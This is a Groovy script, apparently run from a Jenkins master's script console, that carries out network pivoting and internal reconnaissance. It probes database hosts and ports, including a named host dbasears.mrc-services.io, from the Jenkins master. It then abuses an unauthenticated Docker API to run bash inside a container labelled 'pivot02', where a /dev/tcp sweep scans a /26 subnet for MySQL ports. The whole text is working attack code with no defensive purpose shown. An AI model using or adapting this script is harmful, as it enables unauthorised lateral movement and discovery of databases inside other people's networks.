// 1) DNS + direct socket from Jenkins master itself (different network vantage)
// 2) Sweep upper half 172.27.141.64-126 from pivot02
dockerApi = "http://172.27.140.148:4243"

println "=== JENKINS MASTER VANTAGE ==="
try {
    def addr = InetAddress.getByName("dbasears.mrc-services.io")
    println "DNS_OK dbasears.mrc-services.io -> " + addr.getHostAddress()
} catch (Exception e) {
    println "DNS_FAIL dbasears.mrc-services.io: " + e.getMessage()
}
["dbasears.mrc-services.io:3308", "172.27.141.24:3308", "172.27.141.6:3310", "172.27.141.4:3306"].each { hp ->
    def (h, p) = hp.split(":")
    try {
        def s = new Socket()
        s.connect(new InetSocketAddress(h, p as int), 4000)
        println "MASTER_TCP_OK " + hp
        s.close()
    } catch (Exception e) {
        println "MASTER_TCP_FAIL " + hp + " | " + e.getMessage()
    }
}
// What network is the Jenkins master on?
try {
    println "Master hostname: " + InetAddress.getLocalHost().getHostName() + " / " + InetAddress.getLocalHost().getHostAddress()
} catch (Exception e) { println "hostname err: " + e.message }

// 2) Upper subnet sweep from pivot02
def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(180000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String containerId, String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def sweepCmd = '''
sweep_host() {
  local h=$1
  for p in 3306 3308 3310; do
    timeout 2 bash -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null && echo "OPEN|$h|$p"
  done
}
for i in $(seq 64 126); do
  ( sweep_host 172.27.141.$i ) &
done
wait
echo "SWEEP_UPPER_DONE"
'''
println ""
println "########## SWEEP 172.27.141.64-126 ##########"
println execIn("5b32e909c295", sweepCmd)
